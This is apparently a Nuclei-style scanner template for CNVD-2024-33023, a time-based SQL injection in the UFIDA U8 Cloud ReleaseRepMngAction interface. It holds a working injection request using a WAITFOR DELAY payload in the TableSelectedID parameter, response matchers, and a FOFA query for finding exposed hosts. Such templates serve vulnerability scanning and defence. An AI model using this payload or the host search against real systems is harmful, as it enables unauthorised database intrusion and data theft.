http:
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - status_code == 200
    - contains(body,"iUFO")
    - contains(content_type,"text/html")
    type: dsl
  raw:
  - '@timeout 20s

    GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.ReleaseRepMngAction&method=updateDelFlag&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:6%27--
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CNVD-2024-33023
info:
  author: s4e-io
  description: 'The UFIDA U8 Cloud system interface ReleaseRepMngAction has a SQL
    injection vulnerability, which allows an attacker to manipulate the database through
    a maliciously constructed SQL statement, resulting in data leaks, tampering or
    destruction, and seriously threatening system security.

    '
  metadata:
    fofa-query: title=="U8C"
    max-request: 1
    verified: true
  name: UFIDA U8 Cloud - SQL Injection
  reference:
  - https://cap.oyg.cn/detail/431168
  - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8-Cloud%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3ReleaseRepMngAction%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CNVD-2024-33023).md
  severity: high
  tags: cnvd,cnvd2024,yonyou,u8-cloud,sqli,time-based-sqli,vuln
